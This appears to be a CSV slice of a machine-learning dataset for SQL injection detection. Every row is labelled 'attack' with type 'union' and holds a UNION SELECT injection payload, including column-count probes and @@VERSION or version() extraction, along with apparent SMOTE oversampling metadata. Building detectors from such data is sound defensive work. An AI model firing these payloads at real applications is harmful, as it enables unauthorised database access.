id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000755,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,0.8426188947973539
SMOTE_000756,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000063,1.665156896584079
SMOTE_000757,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000066,0.12131036089773076
SMOTE_000758,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,0.6011525730312811
SMOTE_000759,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,0.7403021671082859
SMOTE_000760,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000104,0.01229522224438953
SMOTE_000761,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000155,0.024539770497105897
SMOTE_000762,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000045,1.4722477410572214
SMOTE_000763,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,1.4671828858379468
SMOTE_000764,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,0.9438301925598135
SMOTE_000765,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,1.384227544423736
SMOTE_000766,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,1.0137866421534667
SMOTE_000767,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000102,0.3438877631802463
SMOTE_000768,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,1.0331537168874416
SMOTE_000769,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000102,0.2712624422520865
SMOTE_000770,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000137,1.4624311366581155
SMOTE_000771,attack,union,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,nearest_attack_euclidean,R000139,1.5232345321654546
SMOTE_000772,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,0.4007888163370614
SMOTE_000773,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000096,0.38968017862046433
SMOTE_000774,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000057,0.8290449614103212
SMOTE_000775,attack,union,"1""  )   where 5870  =  5870 union all select null,null,null--",nearest_attack_euclidean,R000111,0.36564741091335234
SMOTE_000776,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.4376869231236549
SMOTE_000777,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000098,0.3224170093298576
SMOTE_000778,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000045,0.052679089063630495
SMOTE_000779,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000031,0.932427070067756
SMOTE_000780,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,0.025731562900416845
SMOTE_000781,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,1.3508774803670869
SMOTE_000782,attack,union,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",nearest_attack_euclidean,R000140,1.072303854665363
SMOTE_000783,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,0.3164332470137934
SMOTE_000784,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000147,0.4263274593640875
SMOTE_000785,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,0.4012060178377177
SMOTE_000786,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000066,1.1006064551233128
SMOTE_000787,attack,union," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000014,0.3518246230964985
SMOTE_000788,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,0.8895672932156524
SMOTE_000789,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.7199764276822632
SMOTE_000790,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000095,0.3330075189613518
SMOTE_000791,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000136,0.5996836178163779
SMOTE_000792,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,0.0015782038593428222
SMOTE_000793,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,0.692254794288531
SMOTE_000794,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000118,1.5146267822519521
SMOTE_000795,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,1.2247391521910274
SMOTE_000796,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,1.6244291143856497
SMOTE_000797,attack,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",nearest_attack_euclidean,R000099,0.5436991138361909
SMOTE_000798,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,1.1824359619653744
SMOTE_000799,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000056,0.3215845601141674
SMOTE_000800,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.31918768015382476
SMOTE_000801,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,0.6328904256342645
SMOTE_000802,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000043,0.6744486633105671
SMOTE_000803,attack,union,"1""  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000059,0.02738529144250999
SMOTE_000804,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,0.12618145119490307
SMOTE_000805,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000112,1.8619310440077397
SMOTE_000806,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000143,0.0065196109049521864
SMOTE_000807,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000086,1.412525789012775
SMOTE_000808,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000098,0.46376496498129555
SMOTE_000809,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,0.21015386880858317
SMOTE_000810,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000066,0.44504950308609986
SMOTE_000811,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,0.0793671236656943
SMOTE_000812,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,0.7880314319055771
SMOTE_000813,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000010,0.5208815526273164
SMOTE_000814,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000136,0.23304476658213338
SMOTE_000815,attack,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",nearest_attack_euclidean,R000099,0.474185847936501
SMOTE_000816,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000074,0.7891125634039862
SMOTE_000817,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.10534575443975196
SMOTE_000818,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000003,0.9132688962067903
SMOTE_000819,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.07779323433117186
SMOTE_000820,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,0.4879166465089195
SMOTE_000821,attack,union,"1%'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000105,0.0788887401916091
SMOTE_000822,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,0.3086174073077778
SMOTE_000823,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000056,0.2706630730209746
SMOTE_000824,attack,union,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",nearest_attack_euclidean,R000140,0.39400993822964936
SMOTE_000825,attack,union,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",nearest_attack_euclidean,R000065,1.279635724684637
SMOTE_000826,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,0.44657451232590917
SMOTE_000827,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,0.5111846011710505
SMOTE_000828,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,3.2213254533218287
SMOTE_000829,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,0.26684705716233864
SMOTE_000830,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000042,0.26331221475811334
SMOTE_000831,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,0.8168943980280968
SMOTE_000832,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R000072,0.8718174344157257
SMOTE_000833,attack,union," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000007,0.716502633198488
SMOTE_000834,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.5730919758477007
SMOTE_000835,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000024,2.1403734340659084
SMOTE_000836,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,1.0747240402245395
SMOTE_000837,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000049,0.31824086104513927
SMOTE_000838,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000078,0.06927501802499458
SMOTE_000839,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000098,0.7901451526226256
SMOTE_000840,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000092,0.39123931415138974
SMOTE_000841,attack,union,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,nearest_attack_euclidean,R000139,0.3876188974439731
SMOTE_000842,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,0.23235801852127322
SMOTE_000843,attack,union,"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",nearest_attack_euclidean,R000114,1.3701976238813545
SMOTE_000844,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000051,0.20186121158460185
SMOTE_000845,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000067,0.2527869605552882
SMOTE_000846,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000047,0.15738315142026463
SMOTE_000847,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,1.4798904615009794
SMOTE_000848,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,0.6934788720008487
SMOTE_000849,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000097,1.540182284465
SMOTE_000850,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000061,0.5886359307094581
SMOTE_000851,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,1.3813927313437835
SMOTE_000852,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,0.4445851206625637
SMOTE_000853,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.19782674656147115
SMOTE_000854,attack,union,"1""  )   where 5870  =  5870 union all select null,null,null--",nearest_attack_euclidean,R000111,0.7876138613274709
SMOTE_000855,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000060,0.9746053710657493
SMOTE_000856,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000100,0.21487779129772452
SMOTE_000857,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,1.3988385669031322
